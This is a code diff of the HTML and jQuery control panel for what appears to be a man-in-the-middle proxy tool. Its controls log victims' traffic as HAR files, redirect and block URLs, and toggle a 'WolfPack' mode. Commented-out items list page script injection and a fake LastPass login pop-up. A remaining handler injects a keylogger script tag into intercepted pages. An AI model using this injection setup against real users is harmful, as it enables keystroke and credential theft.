@@ -10,24 +10,25 @@
   <section class="col-md-4 proxy-controls">
     <div class="panel panel-default">
       <!-- Default panel contents -->
-      <div class="panel-heading"><h5>Proxy Controls</h5>
+      <div class="panel-heading">
+        <h5>Proxy Controls</h5>
       </div>
 
       <!-- List group -->
       <ul class="list-group">
         <li class="list-group-item">
-          <div class="onoffswitch">
-            <input type="checkbox" name="passthrough" class="onoffswitch-checkbox" id="passthrough">
-            <label class="onoffswitch-label" for="passthrough">
+          <!-- <div class="onoffswitch">
+            <input type="checkbox" name="startSimpleProxy" class="onoffswitch-checkbox" id="startSimpleProxy">
+            <label class="onoffswitch-label" for="startSimpleProxy">
               <span class="onoffswitch-inner"></span>
               <span class="onoffswitch-switch"></span>
             </label>
-          </div>
+          </div> -->
           <h4>Simple Proxy</h4>
           <small>Allows all connections through however data will be stored as a HAR file</small>
         </li>
 
-        <li class="list-group-item">
+        <!-- <li class="list-group-item">
           <div class="onoffswitch">
             <input type="checkbox" name="replaceImages" class="onoffswitch-checkbox" id="replaceImages" disabled="true">
             <label class="onoffswitch-label" for="replaceImages">
@@ -36,9 +37,9 @@
             </label>
           </div>
           <h4><s>Replace All Images</s></h4>
-    <small>Replace the images on the page - disabled currently</small>
-        </li>
-        <li class="list-group-item">
+          <small>Replace the images on the page - disabled currently</small>
+        </li> -->
+        <!-- <li class="list-group-item">
           <div class="onoffswitch">
             <input type="checkbox" name="flipImages" class="onoffswitch-checkbox" id="flipImages" disabled="true">
             <label class="onoffswitch-label" for="flipImages">
@@ -47,12 +48,12 @@
             </label>
           </div>
           <h4><s>Flip Images</s></h4>
-        <small>Flip the images on the page 180 degrees - disabled currently</small>
-        </li>
+          <small>Flip the images on the page 180 degrees - disabled currently</small>
+        </li> -->
         <li class="list-group-item">
           <div class="onoffswitch">
-            <input type="checkbox" name="redirect" class="onoffswitch-checkbox" id="redirect">
-            <label class="onoffswitch-label" for="redirect">
+            <input type="checkbox" name="triggerRedirects" class="onoffswitch-checkbox" id="triggerRedirects">
+            <label class="onoffswitch-label" for="triggerRedirects">
               <span class="onoffswitch-inner"></span>
               <span class="onoffswitch-switch"></span>
             </label>
@@ -63,8 +64,8 @@
 
         <li class="list-group-item">
           <div class="onoffswitch">
-            <input type="checkbox" name="block" class="onoffswitch-checkbox" id="block">
-            <label class="onoffswitch-label" for="block">
+            <input type="checkbox" name="triggerBlocks" class="onoffswitch-checkbox" id="triggerBlocks">
+            <label class="onoffswitch-label" for="triggerBlocks">
               <span class="onoffswitch-inner"></span>
               <span class="onoffswitch-switch"></span>
             </label>
@@ -72,7 +73,7 @@
           <h4>Block URLs</h4>
           <small>If url is in whitelist (currently hardcoded), the client will be blocked. This cant handle HTTPS/HSTS</small>
         </li>
-        <li class="list-group-item list-group-item-toggle dropdown-toggle" aria-expanded="false">
+        <!-- <li class="list-group-item list-group-item-toggle dropdown-toggle" aria-expanded="false">
           <a data-toggle="collapse" href="#collapseInject" aria-expanded="true" data-toggle="dropdown" aria-controls="collapseInject"><h4>Inject Hook in HTTP <span class="caret"></span></h4>
           <small>Array of scripts that can be injected into the clients page</small>
           </a>
@@ -136,11 +137,12 @@
             <h4>Request Lastpass Login</h4>
             <small>Pop up a lastpass login on the user's screen</small>
           </li>
-          </ul>
+          </ul>-->
+
         <li class="list-group-item">
         <div class="onoffswitch">
-            <input type="checkbox" name="intercept" class="onoffswitch-checkbox" id="intercept">
-            <label class="onoffswitch-label" for="intercept">
+            <input type="checkbox" name="triggerWolfPack" class="onoffswitch-checkbox" id="triggerWolfPack">
+            <label class="onoffswitch-label" for="triggerWolfPack">
               <span class="onoffswitch-inner"></span>
               <span class="onoffswitch-switch"></span>
             </label>
@@ -210,17 +212,33 @@
 </div>
 <script type="text/javascript">
 
-  $(".toplevel").click(function() {
-    $(".btn").removeClass("btn-success")
-    $(this).addClass("btn-success")
-  })
-  $("#passthrough").click(function() {
-    $.get( "/PassThrough", function( data ) {
-    });
-  })
+  $("#startSimpleProxy").click( function () {
+    $.get( "/StartSimpleProxy", function ( data ) { console.log('StartSimpleProxy: ', data); } );
+  });
+  $("#triggerRedirects").click( function () {
+    $.get( "/TriggerRedirects", function ( data ) { console.log('Redirect: ', data); } );
+  });
+  $("#triggerBlocks").click( function () {
+    $.get( "/TriggerBlocks", function ( data ) { console.log('Blocking: ', data); } );
+  });
+  $("#triggerWolfPack").click( function () {
+    $.get( "/TriggerWolfPack", function ( data ) { console.log('Wolf-pack: ', data); } );
+  });
+
+
+
+
+
+
+
+  $(".toplevel").click( function () {
+    $(".btn").removeClass("btn-success");
+    $(this).addClass("btn-success");
+  });
+  
   $("#deletehars").click(function() {
-     $.get( "/App/DeleteHars", function( data ) {
-      $.each(data, function(i, d) {
+     $.get( "/App/DeleteHars", function ( data ) {
+      $.each(data, function (i, d) {
         var descr = d.split("_", -1)
         console.log(descr)
         $("#clients").append('<button class="btn btn-default" id="passthrough">'+descr[1]+' : ' + descr[2]+'</button>')
@@ -243,14 +261,14 @@
     //   $(".attackType").html("Flip Images")
     // });
   })
-  $("#redirect").click(function() {
-    $.get( "/RedirectPage", function( data ) {
-    });
-  })
-  $("#block").click(function() {
-    $.get( "/BlockWebsites", function( data ) {
-    });
-  })
+  // $("#redirect").click(function() {
+  //   $.get( "/RedirectPage", function( data ) {
+  //   });
+  // })
+  // $("#block").click(function() {
+  //   $.get( "/BlockWebsites", function( data ) {
+  //   });
+  // })
   $("#keylogger").click(function() {
     $.get( "/InjectScript?replace=</body>&result=%3Cscript%20src%3D%22http://127.0.0.1:9000/public/InjectionScripts%2Fkeylogger.js%22%3E%3C%2Fscript%3E</body>", function( data ) {
     });
